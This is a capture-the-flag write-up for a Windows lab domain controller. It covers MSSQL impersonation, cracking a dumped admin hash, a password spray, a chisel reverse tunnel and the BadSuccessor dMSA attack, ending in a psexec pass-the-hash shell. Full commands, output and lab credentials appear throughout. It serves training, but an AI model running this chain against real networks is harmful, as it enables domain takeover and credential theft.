## Lab Details
- Difficulty: Easy
- OS: Windows 

## Summary
- Initial access: Weak credential
- Privilege escalation: Badsuccessor Attack 

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.48.114 -p- -sC -sV -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 07:18 -0700
Nmap scan report for 10.129.48.114
Host is up (0.22s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-04T14:37:58
|_Not valid after:  2056-06-04T14:37:58
| ms-sql-ntlm-info:
|   10.129.48.114:1433:
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2026-06-04T14:51:40+00:00; +24m33s from scanner time.
| ms-sql-info:
|   10.129.48.114:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
- We are provided with below credential 
```
kevin / iNa2we6haRj2gaw!
```
## Foothold

#### Steps
- Use credential provided to enumerate MSSQL
- Enumerate databases 
```
SQL (kevin  guest@master)> SELECT name, database_id, create_date FROM sys.databases;
name                database_id   create_date
-----------------   -----------   -----------
master                        1   2003-04-08 09:13:36
tempdb                        2   2026-06-04 07:37:59
model                         3   2003-04-08 09:13:36
msdb                          4   2022-10-08 06:31:57
financial_planner             5   2025-10-27 13:26:56
```
- Enumerate users that we can impersonate, identified that we can impersonate user appdev
```
SQL (kevin  guest@master)> SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
name
------
appdev

SQL (kevin  guest@master)> exec_as_login appdev
```
- Enumerate tables in `finanical_planner` as appdev
```
SQL (appdev  appdev@financial_planner)> SELECT name AS msdb FROM sys.tables;
msdb
-----------
users
incomes
expenses
allocations
analytics
visits
```
- Obtain user hash for admin user 
```
SQL (appdev  appdev@financial_planner)> select * from users
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
```
- The hash is in `pbkdf2` format convert the hash into hashcat hash format using below script 
```
$ cat hash_convert.py
import base64

hash = 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'

salt = hash.split('$')[1]
key = hash.split('$')[2]

print(f'{":".join(hash.split("$")[0].split(":")[1:])}:{base64.b64encode(salt.encode()).decode("utf-8")}:{base64.b64encode(bytes.fromhex(key)).decode()}')
```

```
$ python3 hash_convert.py
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```
- Crack the hash using hashcat to obtain the plaintext password 
```
$ hashcat -m 10900 hash  /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<SNIP>

sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1

<SNIP>
```

```
admin : iloveyou1
```
- Obtain all available users in target AD
```
nxc mssql 10.129.48.114 -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute > users.txt
```
- Strip extra info from the entries 
```
$ grep 'EIGHTEEN\\' users.txt | sed 's/.*EIGHTEEN\\//' > names_only.txt
```

```
$ awk '!/ /' names_only.txt > users_only.txt
```
- Perform password spray 
```
$ nxc winrm 10.129.48.114 -u users_only.txt -p 'iloveyou1'
WINRM       10.129.48.114   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\Administrator:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\Guest:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\krbtgt:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\DC01$:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\DnsAdmins:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\DnsUpdateProxy:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\mssqlsvc:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\SQLServer2005SQLBrowserUser$DC01:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\HR:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\IT:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\Finance:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
WINRM       10.129.48.114   5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
WINRM       10.129.48.114   5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```
- Able to find another user with the same password 
```
$ evil-winrm -i 10.129.48.114 -u adam.scott -p iloveyou1
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Load and run `sharphound` to collect AD info 
```
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> ./SharpHound.exe -c All
```
- Enumerate the AD environment using bloodhound 
![[Pasted image 20260606102825.png]]
- Identified an OU named STAFF which contains groups and users 
- Check the ACL of the OU
```
*Evil-WinRM* PS C:\Users\adam.scott> Get-ObjectAcl -DistinguishedName "OU=Staff,DC=eighteen,DC=htb" |select-object SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                                                                                                  ActiveDirectoryRights
------------------                                                                                                  ---------------------
S-1-5-32-548                                                                                                     CreateChild, DeleteChild
S-1-5-32-548                                                                                                     CreateChild, DeleteChild
S-1-5-32-548                                                                                                     CreateChild, DeleteChild
S-1-5-32-550                                                                                                     CreateChild, DeleteChild
S-1-5-32-548                                                                                                     CreateChild, DeleteChild
S-1-5-21-1152179935-589108180-1989892463-1604                                                                                 CreateChild
S-1-5-21-1152179935-589108180-1989892463-512                                                                                   GenericAll
S-1-5-9                                                                                                                       GenericRead
S-1-5-11                                                                                                                      GenericRead
S-1-5-18                                                                                                                       GenericAll
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-32-554                                                                                                                 ReadProperty
S-1-5-21-1152179935-589108180-1989892463-526                                                                  ReadProperty, WriteProperty
S-1-5-21-1152179935-589108180-1989892463-527                                                                  ReadProperty, WriteProperty
S-1-3-0                                                                                                                              Self
S-1-5-10                                                                                                                             Self
S-1-5-9                                                                                                                      ReadProperty
S-1-5-9                                                                                                                      ReadProperty
S-1-5-9                                                                                                                      ReadProperty
S-1-5-10                                                                                                                    WriteProperty
S-1-5-32-554                                                                                                                  GenericRead
S-1-5-32-554                                                                                                                  GenericRead
S-1-5-32-554                                                                                                                  GenericRead
S-1-5-10                                                                                                      ReadProperty, WriteProperty
S-1-5-10                                                                                       ReadProperty, WriteProperty, ExtendedRight
S-1-5-21-1152179935-589108180-1989892463-519                                                                                   GenericAll
S-1-5-32-554                                                                                                                 ListChildren
S-1-5-32-544                                  CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
```
- Enumerate the objects that has access to it found that the group IT has `creatchild` access 
```
*Evil-WinRM* PS C:\Users\adam.scott> ConvertFrom-SID "S-1-5-21-1152179935-589108180-1989892463-1604"
EIGHTEEN\IT
```
- Since the user have control belongs to that group we can perform the `badsuccesor` attack 
- The target does not have ldap ports available to the external network, we will need to set up chisel for port forwarding 
```
## on local
$ sudo ./chisel server --socks5 --reverse -p 8888

## on target
*Evil-WinRM* PS C:\Users\adam.scott> ./chisel.exe client 10.10.14.17:8888 R:socks
```
- Use `nxc` to check for `badsuccessor` vulnerability 
```
$ sudo proxychains nxc ldap 127.0.0.1 -u adam.scott -p iloveyou1 -M badsuccessor
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:636  ...  OK
LDAP        127.0.0.1       389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
LDAP        127.0.0.1       389    DC01             [+] eighteen.htb\adam.scott:iloveyou1
BADSUCCE... 127.0.0.1       389    DC01             [+] Found domain controller with operating system Windows Server 2025: 224.0.0.1 (DC01.eighteen.htb)
BADSUCCE... 127.0.0.1       389    DC01             [+] Found 1 results
BADSUCCE... 127.0.0.1       389    DC01             IT (S-1-5-21-1152179935-589108180-1989892463-1604), OU=Staff,DC=eighteen,DC=htb
```
- Since the current version of `nxc` does not have the auto exploit function we will need to download a branch that does have the capability 
```
https://github.com/Pennyw0rth/NetExec/pull/1163
```
- First we will need to remove the current netexec if it exists
```bash
## remote nxc if install 
$ sudo apt remove netexec
```
- Then download UV package manager and then install the `nxc` with `badsuccessor` exploit capability 
```
## download uv tool to fetch for the branch with badsuccessor 
$ pipx install uv
$ uv tool install --force git+https://github.com/azoxlpf/NetExec.git@feat/refactor-badsuccessor
```
 - Once we have the nxc with `badsuccesor` exploit capability installed we can attempt to exploit it 
```
$ sudo proxychains /home/kali/.local/bin/nxc ldap 127.0.0.1 -u adam.scott -p iloveyou1 -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:636  ...  OK
LDAP        127.0.0.1       389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
LDAP        127.0.0.1       389    DC01             [+] eighteen.htb\adam.scott:iloveyou1
BADSUCCE... 127.0.0.1       389    DC01             [+] Found DC with Windows Server 2025: 224.0.0.1 (DC01.eighteen.htb)
BADSUCCE... 127.0.0.1       389    DC01             [+] dMSA 'dMSA-8EKXTA7Q$' created at CN=dMSA-8EKXTA7Q,OU=Staff,DC=eighteen,DC=htb
BADSUCCE... 127.0.0.1       389    DC01             DNS Hostname: dmsa-8ekxta7q.eighteen.htb
BADSUCCE... 127.0.0.1       389    DC01             Migration state: 2 (completed)
BADSUCCE... 127.0.0.1       389    DC01             Target account: CN=Administrator,CN=Users,DC=eighteen,DC=htb
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
BADSUCCE... 127.0.0.1       389    DC01             [-] Failed to get TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
- We get error with clock skew 
- Use below script to sync time with the DC
```
$ sudo date -s "$(curl -Iv http://10.129.48.114 2>/dev/null|grep Date|sed 's/Date: //g')"
Thu Jun  4 10:48:30 AM PDT 2026
```
- Run it again we get an admin ticket
```
$ sudo proxychains /home/kali/.local/bin/nxc ldap 127.0.0.1 -u adam.scott -p iloveyou1 -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:636  ...  OK
LDAP        127.0.0.1       389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
LDAP        127.0.0.1       389    DC01             [+] eighteen.htb\adam.scott:iloveyou1
BADSUCCE... 127.0.0.1       389    DC01             [+] Found DC with Windows Server 2025: 224.0.0.1 (DC01.eighteen.htb)
BADSUCCE... 127.0.0.1       389    DC01             [+] dMSA 'dMSA-65M7ZQJ8$' created at CN=dMSA-65M7ZQJ8,OU=Staff,DC=eighteen,DC=htb
BADSUCCE... 127.0.0.1       389    DC01             DNS Hostname: dmsa-65m7zqj8.eighteen.htb
BADSUCCE... 127.0.0.1       389    DC01             Migration state: 2 (completed)
BADSUCCE... 127.0.0.1       389    DC01             Target account: CN=Administrator,CN=Users,DC=eighteen,DC=htb
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
BADSUCCE... 127.0.0.1       389    DC01             [+] Current keys:
BADSUCCE... 127.0.0.1       389    DC01             EncryptionTypes.aes256_cts_hmac_sha1_96: c3587409c78477fc851fe99cdf8418f65ccc6de6fe613429d12ff719b4b1737f
BADSUCCE... 127.0.0.1       389    DC01             EncryptionTypes.aes128_cts_hmac_sha1_96: 3b97195e71a71539e4b65c22846c0835
BADSUCCE... 127.0.0.1       389    DC01             EncryptionTypes.rc4_hmac: c29b89aa35f009c827b953d52e46ff70
BADSUCCE... 127.0.0.1       389    DC01             [+] Previous keys:
BADSUCCE... 127.0.0.1       389    DC01             EncryptionTypes.rc4_hmac: 0b133be956bfaddf9cea56701affddec
BADSUCCE... 127.0.0.1       389    DC01             [+] Service ticket saved to dMSA-65M7ZQJ8$.ccache
```
- We can use the admin ticket to obtain a shell via `psexec`
```
$ sudo proxychains impacket-psexec -hashes ':0b133be956bfaddf9cea56701affddec' Administrator@127.0.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file NuoEktkT.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service oMVu on 127.0.0.1.....
[*] Starting service oMVu.....
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
Microsoft Windows [Version 10.0.26100.4349]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```
## Lessons Learned
- Attack family:
- Key takeaway: Learn about the `badsuccessor` attack and how to exploit when its available 

## Resources
- References:
